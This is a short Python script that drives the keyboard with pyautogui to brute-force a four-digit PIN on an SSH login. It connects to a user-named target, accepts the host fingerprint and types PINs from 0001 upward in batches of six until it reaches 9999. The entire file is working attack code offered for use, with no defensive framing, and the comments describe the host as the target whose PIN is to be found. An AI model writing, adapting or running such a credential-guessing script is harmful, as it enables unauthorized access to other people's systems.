#import modules
import pyautogui
import time
import os

#define variables
found = False
count = 0

#Sak for username and ip of target
user = input("input user: ")
time.sleep(2)

#loop that continues untill pin is found
while found != True and count < 9999:
  #type ssh command with username and ip
    pyautogui.write(f"ssh {user}")
    time.sleep(2)
    pyautogui.press('enter')
    time.sleep(30)
  #confirm fingerprints  
    pyautogui.write(f"yes")
    time.sleep(2)
    pyautogui.press('enter')
  #run through pins in increments of 6 
    for i in range (6):
      #counts up untill 9999
      count += 1
      #types out "count" in four diget format
      pyautogui.write(f"{count:04d}", interval=0.01)
      pyautogui.press('enter')  

